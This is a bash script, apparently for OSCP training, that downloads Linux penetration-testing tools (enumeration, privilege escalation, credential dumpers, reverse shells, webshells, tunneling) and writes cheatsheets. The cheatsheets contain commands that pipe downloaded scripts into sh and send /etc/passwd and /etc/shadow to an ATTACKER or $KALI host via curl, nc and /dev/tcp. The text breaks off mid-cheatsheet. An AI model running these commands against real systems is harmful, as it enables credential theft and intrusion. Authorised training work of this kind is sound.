#!/bin/bash

#=============================================================================
# LINUX-ARSENAL - Linux Pentesting Tools Downloader
# + @mahdiesta - All enumeration tools, no auto-exploitation
# Focus: Linux PrivEsc, Enumeration, Post-Exploitation
#=============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_TOOLS_DIR="${HOME}/linux-tools"
TOOLS_DIR="${1:-$DEFAULT_TOOLS_DIR}"

# Create directories
mkdir -p "${TOOLS_DIR}" 2>/dev/null
TEMP_DIR="${TOOLS_DIR}/.tmp"
LOG_FILE="${TOOLS_DIR}/download.log"
mkdir -p "${TEMP_DIR}" 2>/dev/null
touch "${LOG_FILE}" 2>/dev/null

#=============================================================================
# HELPER FUNCTIONS
#=============================================================================

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    [ -f "${LOG_FILE}" ] && echo "${timestamp} [${level}] ${message}" >> "${LOG_FILE}" 2>/dev/null
    
    case "$level" in
        "INFO")   echo -e "${GREEN}[+]${NC} ${message}" ;;
        "WARN")   echo -e "${YELLOW}[!]${NC} ${message}" ;;
        "ERROR")  echo -e "${RED}[-]${NC} ${message}" ;;
        "DEBUG")  echo -e "${BLUE}[*]${NC} ${message}" ;;
        "HEADER") echo -e "\n${PURPLE}[===]${NC} ${message}" ;;
    esac
}

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
+-----------------------------------------------------------------------------+
|  LINUX-ARSENAL - Linux Penetration Testing Toolkit                          |
|  OSCP/OSCP+ Compliant - Enumeration Tools and Transfer Methods              |
+-----------------------------------------------------------------------------+
EOF
    echo -e "${NC}"
}

check_dependencies() {
    log "HEADER" "Checking Dependencies"
    
    local deps=("curl" "wget" "git" "unzip" "gunzip" "tar")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "WARN" "Missing: ${missing[*]}"
        log "INFO" "Installing..."
        sudo apt-get update -qq 2>/dev/null
        sudo apt-get install -y -qq "${missing[@]}" 2>/dev/null
    fi
    
    log "INFO" "Dependencies OK"
}

create_directories() {
    log "HEADER" "Creating Directory Structure"
    
    local dirs=(
        "enumeration"
        "privesc"
        "exploit-suggesters"
        "command-generators"
        "process-monitor"
        "tunneling"
        "shells"
        "transfer"
        "persistence"
        "credentials"
        "network"
        "cheatsheets"
        "python-tools"
        "wordlists"
        "static-binaries"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "${TOOLS_DIR}/${dir}"
    done
    
    log "INFO" "Directories created"
}

download_file() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    if [ -z "$url" ]; then
        return 1
    fi
    
    if curl -sL --connect-timeout 15 --max-time 120 -o "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    if wget -q --timeout=15 -O "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    rm -f "${output}" 2>/dev/null
    log "WARN" "Failed: ${name}"
    return 1
}

download_with_fallback() {
    local name="$1"
    local output="$2"
    shift 2
    local urls=("$@")
    
    for url in "${urls[@]}"; do
        if download_file "$url" "$output" "$name"; then
            return 0
        fi
    done
    
    log "WARN" "All URLs failed: ${name}"
    return 1
}

git_clone() {
    local repo="$1"
    local dest="$2"
    local name="$3"
    
    if [ -d "${dest}" ]; then
        log "INFO" "${name} (exists)"
        return 0
    fi
    
    if git clone --depth 1 "${repo}" "${dest}" 2>/dev/null; then
        log "INFO" "${name}"
        return 0
    else
        log "WARN" "Failed to clone: ${name}"
        return 1
    fi
}

#=============================================================================
# DOWNLOAD FUNCTIONS
#=============================================================================

download_enumeration_scripts() {
    log "HEADER" "Downloading Enumeration Scripts (OSCP Allowed)"
    
    local enum="${TOOLS_DIR}/enumeration"
    local priv="${TOOLS_DIR}/privesc"
    local exp="${TOOLS_DIR}/exploit-suggesters"
    local proc="${TOOLS_DIR}/process-monitor"
    
    #=========================================================================
    # TIER 1: PRIMARY ENUMERATION (Use these first)
    #=========================================================================
    log "DEBUG" "Tier 1: Primary Enumeration Tools..."
    
    # LinPEAS - THE BEST, most comprehensive (USE LATEST VERSION!)
    download_with_fallback "linpeas.sh" "${enum}/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"
    chmod +x "${enum}/linpeas.sh" 2>/dev/null
    
    # LinPEAS variants
    download_file "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh" \
        "${enum}/linpeas_small.sh" "linpeas_small.sh (minimal)"
    chmod +x "${enum}/linpeas_small.sh" 2>/dev/null
    
    # Linux Smart Enumeration (lse.sh) - Great alternative with levels
    download_file "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" \
        "${enum}/lse.sh" "lse.sh (Linux Smart Enumeration)"
    chmod +x "${enum}/lse.sh" 2>/dev/null
    
    # LinEnum - Classic, well-tested
    download_file "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
        "${enum}/LinEnum.sh" "LinEnum.sh"
    chmod +x "${enum}/LinEnum.sh" 2>/dev/null
    
    #=========================================================================
    # TIER 2: SPECIALIZED ENUMERATION
    #=========================================================================
    log "DEBUG" "Tier 2: Specialized Enumeration Tools..."
    
    # linuxprivchecker - Python-based detailed checks
    download_file "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" \
        "${enum}/linuxprivchecker.py" "linuxprivchecker.py"
    
    # unix-privesc-check - Perl-based, works on legacy systems
    download_file "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check" \
        "${enum}/unix-privesc-check" "unix-privesc-check"
    chmod +x "${enum}/unix-privesc-check" 2>/dev/null
    
    # SUDO_KILLER - Specialized for sudo misconfigurations
    git_clone "https://github.com/TH3xACE/SUDO_KILLER.git" "${priv}/SUDO_KILLER" "SUDO_KILLER"
    
    # suid3num - SUID enumeration
    download_file "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" \
        "${priv}/suid3num.py" "suid3num.py"
    
    #=========================================================================
    # TIER 3: EXPLOIT SUGGESTERS (Kernel/CVE checks)
    #=========================================================================
    log "DEBUG" "Tier 3: Exploit Suggesters..."
    
    # Linux Exploit Suggester (Original)
    download_file "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
        "${exp}/linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
    chmod +x "${exp}/linux-exploit-suggester.sh" 2>/dev/null
    
    # LES2 - Linux Exploit Suggester 2 (newer)
    download_file "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" \
        "${exp}/linux-exploit-suggester-2.pl" "linux-exploit-suggester-2.pl"
    
    # Linux Exploit Suggester - Next Generation
    git_clone "https://github.com/mzet-/linux-exploit-suggester.git" "${exp}/les-ng" "LES-NG (Git)"
    
    #=========================================================================
    # TIER 4: PROCESS MONITORING (Critical for cron jobs!)
    #=========================================================================
    log "DEBUG" "Tier 4: Process Monitoring Tools..."
    
    # pspy - CRITICAL for finding cron jobs without root
    download_with_fallback "pspy64" "${proc}/pspy64" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
    chmod +x "${proc}/pspy64" 2>/dev/null
    
    download_with_fallback "pspy32" "${proc}/pspy32" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
    chmod +x "${proc}/pspy32" 2>/dev/null
    
    # pspy static (smaller)
    download_with_fallback "pspy64s" "${proc}/pspy64s" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s"
    chmod +x "${proc}/pspy64s" 2>/dev/null
    
    download_with_fallback "pspy32s" "${proc}/pspy32s" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s"
    chmod +x "${proc}/pspy32s" 2>/dev/null
}

download_privesc_tools() {
    log "HEADER" "Downloading PrivEsc Tools"
    
    local priv="${TOOLS_DIR}/privesc"
    local cred="${TOOLS_DIR}/credentials"
    local cmd_gen="${TOOLS_DIR}/command-generators"
    
    mkdir -p "${cmd_gen}" 2>/dev/null
    
    #=========================================================================
    # COMMAND GENERATORS (Show exploit commands, don't auto-exploit)
    # Perfect for OSCP - you understand and run commands manually
    #=========================================================================
    log "DEBUG" "Downloading Command Generators (OSCP-friendly)..."
    
    # GTFOBLookup - CLI to query GTFOBins/LOLBAS offline
    # Shows exploit commands for binaries without auto-exploiting
    git_clone "https://github.com/nccgroup/GTFOBLookup.git" "${cmd_gen}/GTFOBLookup" "GTFOBLookup (CLI for GTFOBins)"
    
    # LinEsc - Finds privesc vectors + shows GTFOBins commands
    git_clone "https://github.com/IvanGlinkin/LinEsc.git" "${cmd_gen}/LinEsc" "LinEsc (vector finder + commands)"
    
    # GTFONow - Can enumerate and SHOW commands (use -l 0 for enum only)
    # WARNING: Higher levels auto-exploit, use level 0 for OSCP!
    download_file "https://raw.githubusercontent.com/Frissi0n/GTFONow/main/gtfonow.py" \
        "${cmd_gen}/gtfonow.py" "GTFONow (use -l 0 for safe enum!)"
    
    # suid3num - Already downloads, but also shows GTFOBins commands
    download_file "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" \
        "${cmd_gen}/suid3num.py" "suid3num.py (SUID + GTFOBins commands)"
    
    # linux-smart-enumeration with exploit suggestions
    # lse.sh already downloaded, but noting it shows exploit paths
    
    #=========================================================================
    # SPECIALIZED PRIVESC TOOLS
    #=========================================================================
    log "DEBUG" "Downloading specialized privesc tools..."
    
    # GTFOBins offline reference (clone for offline use)
    git_clone "https://github.com/GTFOBins/GTFOBins.github.io.git" "${priv}/GTFOBins" "GTFOBins (offline)"
    
    # LOLBAS (Windows equivalent - useful for dual-boot targets)
    git_clone "https://github.com/LOLBAS-Project/LOLBAS.git" "${priv}/LOLBAS" "LOLBAS (Windows GTFOBins)"
    
    # traitor - Can enumerate without exploiting (run without -a flag)
    download_with_fallback "traitor-amd64" "${priv}/traitor-amd64" \
        "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64" \
        "https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64"
    chmod +x "${priv}/traitor-amd64" 2>/dev/null
    
    download_with_fallback "traitor-386" "${priv}/traitor-386" \
        "https://github.com/liamg/traitor/releases/latest/download/traitor-386" \
        "https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-386"
    chmod +x "${priv}/traitor-386" 2>/dev/null
    
    # BeRoot - Multi-platform privesc checker
    git_clone "https://github.com/AlessandroZ/BeRoot.git" "${priv}/BeRoot" "BeRoot"
    
    # LinPEAS variants for specific scenarios
    download_file "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64" \
        "${priv}/linpeas_macos" "linpeas_macos (for macOS)"
    chmod +x "${priv}/linpeas_macos" 2>/dev/null
    
    # Credential hunting
    download_file "https://raw.githubusercontent.com/carlospolop/hacktricks/master/linux-hardening/privilege-escalation/README.md" \
        "${cred}/hacktricks-privesc-ref.md" "HackTricks PrivEsc Reference"
    
    # LaZagne (Python) - credential extraction
    git_clone "https://github.com/AlessandroZ/LaZagne.git" "${cred}/LaZagne" "LaZagne (Python)"
    
    # mimipenguin - Linux credential dumper
    git_clone "https://github.com/huntergregal/mimipenguin.git" "${cred}/mimipenguin" "mimipenguin"
}

download_tunneling_tools() {
    log "HEADER" "Downloading Tunneling Tools"
    
    local tun="${TOOLS_DIR}/tunneling"
    
    # Chisel - CRITICAL for pivoting
    download_with_fallback "chisel_linux_amd64" "${TEMP_DIR}/chisel_linux.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
    [ -f "${TEMP_DIR}/chisel_linux.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux.gz" > "${tun}/chisel" 2>/dev/null
    chmod +x "${tun}/chisel" 2>/dev/null
    
    download_with_fallback "chisel_linux_386" "${TEMP_DIR}/chisel_linux_386.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_386.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz"
    [ -f "${TEMP_DIR}/chisel_linux_386.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux_386.gz" > "${tun}/chisel_386" 2>/dev/null
    chmod +x "${tun}/chisel_386" 2>/dev/null
    
    # Ligolo-ng
    download_with_fallback "ligolo_proxy" "${TEMP_DIR}/ligolo_proxy.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz"
    [ -f "${TEMP_DIR}/ligolo_proxy.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_proxy.tar.gz" -C "${tun}/" 2>/dev/null
    
    download_with_fallback "ligolo_agent" "${TEMP_DIR}/ligolo_agent.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz"
    [ -f "${TEMP_DIR}/ligolo_agent.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_agent.tar.gz" -C "${tun}/" 2>/dev/null
    
    # proxychains config
    cat > "${tun}/proxychains.conf" << 'EOF'
# ProxyChains config for SOCKS proxy
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Chisel default
socks5 127.0.0.1 1080
EOF
    log "INFO" "Created proxychains.conf template"
}

download_shells_and_transfer() {
    log "HEADER" "Downloading Shells & Transfer Tools"
    
    local shells="${TOOLS_DIR}/shells"
    local transfer="${TOOLS_DIR}/transfer"
    
    # Reverse shell generators/helpers
    git_clone "https://github.com/mthbernardes/rsg.git" "${shells}/rsg" "Reverse Shell Generator"
    
    # Pentest Monkey shells
    download_file "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" \
        "${shells}/php-reverse-shell.php" "php-reverse-shell.php"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl" \
        "${shells}/perl-reverse-shell.pl" "perl-reverse-shell.pl"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/python-pty-shells/master/tcp_pty_backconnect.py" \
        "${shells}/python-pty-shell.py" "python-pty-shell.py"
    
    # webshells collection
    git_clone "https://github.com/BlackArch/webshells.git" "${shells}/webshells" "webshells collection"
    
    # Static netcat
    download_file "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" \
        "${transfer}/ncat" "ncat (static)"
    chmod +x "${transfer}/ncat" 2>/dev/null
    
    # socat static
    download_file "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
        "${transfer}/socat" "socat (static)"
    chmod +x "${transfer}/socat" 2>/dev/null
}

download_static_binaries() {
    log "HEADER" "Downloading Static Binaries"
    
    local static="${TOOLS_DIR}/static-binaries"
    
    # Static binaries for restricted environments
    log "DEBUG" "Downloading static binaries for restricted shells..."
    
    # Bash static
    download_with_fallback "bash (static)" "${static}/bash" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/bash" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/bash"
    chmod +x "${static}/bash" 2>/dev/null
    
    # Busybox - multiple fallback URLs
    download_with_fallback "busybox (static)" "${static}/busybox" \
        "https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/busybox" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/busybox"
    chmod +x "${static}/busybox" 2>/dev/null
    
    # Curl static
    download_with_fallback "curl (static)" "${static}/curl" \
        "https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64" \
        "https://github.com/moparisthebest/static-curl/releases/download/v8.5.0/curl-amd64" \
        "https://github.com/dtschan/curl-static/releases/download/v7.63.0/curl"
    chmod +x "${static}/curl" 2>/dev/null
    
    # Nmap static
    download_with_fallback "nmap (static)" "${static}/nmap" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/nmap"
    chmod +x "${static}/nmap" 2>/dev/null
    
    # Socat static (backup copy)
    download_with_fallback "socat (static)" "${static}/socat" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/socat"
    chmod +x "${static}/socat" 2>/dev/null
    
    # Ncat static
    download_with_fallback "ncat (static)" "${static}/ncat" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/ncat"
    chmod +x "${static}/ncat" 2>/dev/null
    
    # GDB static (for debugging/exploit dev)
    download_with_fallback "gdb (static)" "${static}/gdb" \
        "https://github.com/hugsy/gdb-static/releases/download/v14.2/gdb-x86_64" \
        "https://github.com/hugsy/gdb-static/releases/download/v12.1/gdb-x86_64"
    chmod +x "${static}/gdb" 2>/dev/null
    
    # tcpdump static
    download_with_fallback "tcpdump (static)" "${static}/tcpdump" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/tcpdump" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/tcpdump"
    chmod +x "${static}/tcpdump" 2>/dev/null
    
    # strace static
    download_with_fallback "strace (static)" "${static}/strace" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/strace" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/strace"
    chmod +x "${static}/strace" 2>/dev/null
}

download_network_tools() {
    log "HEADER" "Downloading Network Tools"
    
    local net="${TOOLS_DIR}/network"
    
    # Responder for Linux (if attacking from Linux)
    git_clone "https://github.com/lgandx/Responder.git" "${net}/Responder" "Responder"
    
    # enum4linux-ng
    git_clone "https://github.com/cddmp/enum4linux-ng.git" "${net}/enum4linux-ng" "enum4linux-ng"
    
    # CrackMapExec / NetExec
    git_clone "https://github.com/Pennyw0rth/NetExec.git" "${net}/NetExec" "NetExec (CME successor)"
    
    # Impacket (essential)
    git_clone "https://github.com/fortra/impacket.git" "${net}/impacket" "impacket"
}

clone_useful_repos() {
    log "HEADER" "Cloning Useful Repositories"
    
    local py="${TOOLS_DIR}/python-tools"
    
    # PayloadsAllTheThings
    git_clone "https://github.com/swisskyrepo/PayloadsAllTheThings.git" "${py}/PayloadsAllTheThings" "PayloadsAllTheThings"
    
    # SecLists (partial - just linux stuff)
    mkdir -p "${TOOLS_DIR}/wordlists" 2>/dev/null
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" \
        "${TOOLS_DIR}/wordlists/10k-passwords.txt" "10k-passwords.txt"
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt" \
        "${TOOLS_DIR}/wordlists/usernames.txt" "usernames.txt"
    
    # HackTricks (reference)
    git_clone "https://github.com/carlospolop/hacktricks.git" "${py}/hacktricks" "HackTricks"
}

#=============================================================================
# DOCUMENTATION & CHEATSHEETS
#=============================================================================

create_cheatsheets() {
    log "HEADER" "Creating Cheatsheets"
    
    local cheat="${TOOLS_DIR}/cheatsheets"
    
    # Tool usage cheatsheet
    cat > "${cheat}/TOOLS-QUICK-REF.md" << 'EOF'
# Linux Arsenal - Quick Reference

## TOOL LOCATIONS
```
enumeration/         - LinPEAS, lse.sh, LinEnum, linuxprivchecker
privesc/             - SUDO_KILLER, GTFOBins, traitor
command-generators/  - suid3num, gtfonow, LinEsc, GTFOBLookup
exploit-suggesters/  - linux-exploit-suggester, les2
process-monitor/     - pspy64, pspy32 (critical for cron)
tunneling/           - chisel, ligolo-ng
shells/              - Reverse shells, webshells
transfer/            - Static ncat, socat
static-binaries/     - For restricted environments
credentials/         - LaZagne, mimipenguin
```

## ENUMERATION PRIORITY (OSCP Order)

### Step 1: Quick System Info
```bash
uname -a
cat /etc/os-release
cat /proc/version
id
whoami
groups
```

### Step 2: Run LinPEAS (Primary)
```bash
./linpeas.sh | tee linpeas_output.txt
./linpeas.sh -q    # Quick scan
# Look for RED/YELLOW = 95% PE vector
```

### Step 3: Run LSE (Alternative/Verification)
```bash
./lse.sh           # Level 0: Critical only
./lse.sh -l1       # Level 1: Useful info
./lse.sh -l2       # Level 2: Full dump
```

### Step 4: Run pspy (Critical for cron)
```bash
./pspy64
./pspy64 -pf -i 1000
# Look for: UID=0 scripts, cron patterns, writable scripts
```

### Step 5: Exploit Suggesters
```bash
./linux-exploit-suggester.sh
perl linux-exploit-suggester-2.pl
```

## QUICK PRIVESC CHECKS

### Sudo
```bash
sudo -l                        # What can we run?
sudo -V                        # Sudo version (CVE-2021-3156?)
cat /etc/sudoers 2>/dev/null   # Full sudoers
```

### SUID/SGID
```bash
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
find / -perm -6000 -type f 2>/dev/null    # Both
# Then check GTFOBins
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Look for: cap_setuid, cap_setgid, cap_net_raw
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Then run pspy to see hidden cron
```
```

### Writable Files/Dirs
```bash
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null | grep -v proc
```

### Network
```bash
netstat -tulpn 2>/dev/null || ss -tulpn
# Internal services running as root?
```

### Passwords
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

## FILE TRANSFER TO TARGET

### HTTP (Attacker)
```bash
# Start server
python3 -m http.server 80
python2 -m SimpleHTTPServer 80
php -S 0.0.0.0:80
```

### Download (Target)
```bash
# wget
wget http://ATTACKER/file -O /tmp/file

# curl
curl http://ATTACKER/file -o /tmp/file

# Bash /dev/tcp (no tools needed!)
cat < /dev/tcp/ATTACKER/80 > /tmp/file

# Base64 (for firewalls)
# Attacker: base64 file | tr -d '\n'
echo "BASE64STRING" | base64 -d > /tmp/file
```

### NC Transfer
```bash
# Attacker (send)
nc -lvnp 4444 < file

# Target (receive)
nc ATTACKER 4444 > /tmp/file
```

## QUICK WINS CHECKLIST

1. [ ] `sudo -l` - anything NOPASSWD?
2. [ ] SUID binaries → GTFOBins
3. [ ] Capabilities → GTFOBins
4. [ ] Kernel version → exploit-suggester
5. [ ] Cron jobs (pspy!)
6. [ ] Writable /etc/passwd?
7. [ ] Password reuse from found creds
8. [ ] Internal services (MySQL root no pass?)
9. [ ] NFS no_root_squash
10. [ ] Docker/LXC group membership

EOF

    # Transfer methods
    cat > "${cheat}/TRANSFER-METHODS.md" << 'EOF'
# File Transfer Methods

## YOUR ATTACKER IP
```bash
export KALI=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
echo "Your IP: $KALI"
```

## QUICK SERVER SCRIPTS

### HTTP Server (auto port selection)
```bash
./serve-http.sh           # Random port 8000-9999
./serve-http.sh 8080      # Specific port
```

### NC Listener (auto port selection)
```bash
./listen.sh               # Default 4444 or next free
./listen.sh 9001          # Specific port
./listen-rlwrap.sh 9001   # With arrow keys/history
```

### SMB Server (Windows targets)
```bash
./serve-smb.sh tools .    # Share current dir as "tools"
# Windows: copy \\KALI\tools\file.exe C:\Temp\
```

### Upload Server (receive from target)
```bash
./serve-upload.sh 8888
# Target: curl -F 'file=@/etc/passwd' http://KALI:8888/upload
```

## HTTP DOWNLOAD METHODS

### Target Download
```bash
wget http://$KALI:PORT/file -O /tmp/file
curl http://$KALI:PORT/file -o /tmp/file
fetch http://$KALI:PORT/file  # FreeBSD
```

### Execute in memory (no disk)
```bash
curl http://$KALI:PORT/linpeas.sh | sh
wget http://$KALI:PORT/linpeas.sh -O- | sh
```

## NETCAT TRANSFER

### File Transfer
```bash
# Attacker (send file)
nc -lvnp 4444 < file

# Target (receive)
nc $KALI 4444 > /tmp/file
```

### Reverse (target sends)
```bash
# Attacker (receive)
nc -lvnp 4444 > received_file

# Target (send)
nc $KALI 4444 < /etc/passwd
```

## BASE64 (Firewall Bypass)

### Small Files
```bash
# Attacker: encode
base64 -w0 file && echo

# Target: decode
echo "BASE64_STRING" | base64 -d > /tmp/file
```

## SCP (If SSH Available)
```bash
scp file user@target:/tmp/
scp user@target:/etc/passwd ./
```

## BASH /dev/tcp (No External Tools!)
```bash
# Download file
cat < /dev/tcp/$KALI/80 > /tmp/file

# Or with exec
exec 3<>/dev/tcp/$KALI/80
echo -e "GET /file HTTP/1.1\r\nHost: $KALI\r\n\r\n" >&3
cat <&3 > /tmp/file
```

## UPLOAD FROM TARGET

### Using curl
```bash
curl -X POST -F "file=@/etc/passwd" http://$KALI:8888/upload
curl --data-binary @/etc/shadow http://$KALI:8888/upload
```

### Using nc
```bash
# Attacker: nc -lvnp 4444 > received.txt
cat /etc/passwd | nc $KALI 4444
```

### Using /dev/tcp
```bash
cat /etc/passwd > /dev/tcp/$KALI/4444
```

EOF

    # Privesc reference
    cat > "${cheat}/PRIVESC-CHECKLIST.md" << 'EOF'
# 🔓 Linux PrivEsc Checklist

## AUTOMATED ENUMERATION
- [ ] LinPEAS
- [ ] lse.sh
- [ ] LinEnum
- [ ] pspy (cron detection)
- [ ] linux-exploit-suggester

## MANUAL CHECKS

### Sudo
- [ ] `sudo -l`
- [ ] sudo version (CVE-2021-3156 Baron Samedit)
- [ ] LD_PRELOAD if env_keep
- [ ] NOPASSWD entries

### SUID/SGID
- [ ] `find / -perm -4000 2>/dev/null`
- [ ] Check GTFOBins for each binary
- [ ] Custom SUID binaries (strings, ltrace)

### Capabilities
- [ ] `getcap -r / 2>/dev/null`
- [ ] cap_setuid+ep on any binary = root

### Cron Jobs
- [ ] `/etc/crontab`
- [ ] `/etc/cron.d/*`
- [ ] User crontabs
- [ ] pspy for hidden crons
- [ ] Writable scripts in PATH
- [ ] Wildcard injection (tar, rsync)

### PATH Hijacking
- [ ] Relative paths in scripts
- [ ] Writable directories in PATH
- [ ] User-controlled PATH

### File Permissions
- [ ] Writable /etc/passwd (add user)
- [ ] Writable /etc/shadow (change password)
- [ ] Writable /etc/sudoers
- [ ] World-writable scripts

### Credentials
- [ ] bash_history
- [ ] .ssh directories
- [ ] Config files (/var/www, /opt, etc.)
- [ ] MySQL credentials
- [ ] Password reuse

### Network
- [ ] Internal services (127.0.0.1)
- [ ] MySQL root no password
- [ ] Services running as root

### Containers
- [ ] docker group → root
- [ ] lxc/lxd group → root
- [ ] Kubernetes misconfigs

### NFS
- [ ] no_root_squash in /etc/exports
- [ ] Mount and create SUID

### Kernel
- [ ] Kernel version → searchsploit
- [ ] Dirty COW (old kernels)
- [ ] PwnKit (CVE-2021-4034)
- [ ] Baron Samedit (sudo CVE-2021-3156)

EOF

    log "INFO" "Created cheatsheets"
    
    # Command Generators cheatsheet
    cat > "${cheat}/COMMAND-GENERATORS.md" << 'EOF'
# Command Generators - OSCP Safe Tools

These tools SHOW you the exploit commands without auto-executing them.
Perfect for OSCP - you understand what you're running!

## Tool Summary

| Tool | What it does | OSCP Safe |
|------|-------------|-----------|
| GTFOBLookup | CLI to query GTFOBins | Always |
| suid3num | Find SUID + show commands | Always |
| GTFONow | Enum + commands | Use -l 0 only |
| traitor | Find vulns | No -a flag |
| LinEsc | Full enum + commands | Always |

## GTFOBLookup - Query GTFOBins from CLI

```bash
# Download
wget http://ATTACKER/command-generators/GTFOBLookup/gtfoblookup.py -O /tmp/gtfo.py

# Query specific binary for sudo exploits
python3 /tmp/gtfo.py linux shell sudo vim
python3 /tmp/gtfo.py linux shell sudo find
python3 /tmp/gtfo.py linux shell sudo python

# Query for SUID exploits
python3 /tmp/gtfo.py linux shell suid find
python3 /tmp/gtfo.py linux shell suid bash
python3 /tmp/gtfo.py linux shell suid cp

# Query for file read
python3 /tmp/gtfo.py linux file-read sudo tar
python3 /tmp/gtfo.py linux file-read suid xxd

# Query for file write
python3 /tmp/gtfo.py linux file-write sudo tee

# List all methods for a binary
python3 /tmp/gtfo.py linux all sudo vim
```

## 🔢 suid3num - SUID Finder + GTFOBins Commands

```bash
